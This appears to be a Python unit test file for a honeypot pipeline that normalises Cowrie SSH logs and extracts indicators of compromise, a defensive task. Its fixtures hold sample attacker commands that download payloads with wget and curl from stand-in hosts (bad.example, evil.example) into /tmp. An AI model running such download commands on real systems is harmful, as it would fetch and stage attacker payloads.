from __future__ import annotations

import unittest

from honeypot_pipeline.cowrie import iter_normalized_cowrie_events
from honeypot_pipeline.ioc import extract_indicators


class CowrieParserTests(unittest.TestCase):
    def test_normalizes_login_failed_event(self) -> None:
        lines = [
            '{"timestamp":"2026-03-18T12:00:00.000000Z","eventid":"cowrie.login.failed",'
            '"src_ip":"203.0.113.10","src_port":60222,"session":"abc123",'
            '"username":"root","password":"toor","protocol":"ssh"}'
        ]

        [event] = list(iter_normalized_cowrie_events(lines))

        self.assertEqual(event.honeypot, "cowrie")
        self.assertEqual(event.event_type, "cowrie.login.failed")
        self.assertEqual(event.source_ip, "203.0.113.10")
        self.assertEqual(event.source_port, 60222)
        self.assertEqual(event.username, "root")
        self.assertEqual(event.password, "toor")

    def test_extracts_basic_indicators(self) -> None:
        lines = [
            '{"timestamp":"2026-03-18T12:05:00.000000Z","eventid":"cowrie.command.input",'
            '"src_ip":"198.51.100.24","session":"abc124","input":"wget http://bad.example/payload.sh",'
            '"url":"http://bad.example/payload.sh"}'
        ]

        [event] = list(iter_normalized_cowrie_events(lines))
        indicators = extract_indicators(event)

        self.assertEqual(indicators["ip_addresses"], ["198.51.100.24"])
        self.assertEqual(indicators["commands"], ["wget http://bad.example/payload.sh"])
        self.assertEqual(indicators["urls"], ["http://bad.example/payload.sh"])
        self.assertEqual(indicators["domains"], ["bad.example"])
        self.assertEqual(indicators["payload_references"], ["http://bad.example/payload.sh"])

    def test_extracts_richer_indicators_from_command_text(self) -> None:
        lines = [
            '{"timestamp":"2026-03-18T12:06:00.000000Z","eventid":"cowrie.command.input",'
            '"src_ip":"198.51.100.24","session":"abc125",'
            '"input":"curl http://evil.example/dropper.elf -o /tmp/dropper.elf && echo '
            'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 192.0.2.44"}'
        ]

        [event] = list(iter_normalized_cowrie_events(lines))
        indicators = extract_indicators(event)

        self.assertIn("192.0.2.44", indicators["ip_addresses"])
        self.assertIn("evil.example", indicators["domains"])
        self.assertIn("/tmp/dropper.elf", indicators["file_paths"])
        self.assertIn("http://evil.example/dropper.elf", indicators["payload_references"])
        self.assertEqual(
            indicators["hashes"],
            [
                {
                    "type": "sha256",
                    "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                }
            ],
        )

    def test_skips_invalid_json_line(self) -> None:
        lines = [
            '{"eventid":',
            '{"eventid":"cowrie.command.input","src_ip":"198.51.100.24","input":"whoami"}',
        ]

        [event] = list(iter_normalized_cowrie_events(lines))
        self.assertEqual(event.event_type, "cowrie.command.input")


if __name__ == "__main__":
    unittest.main()
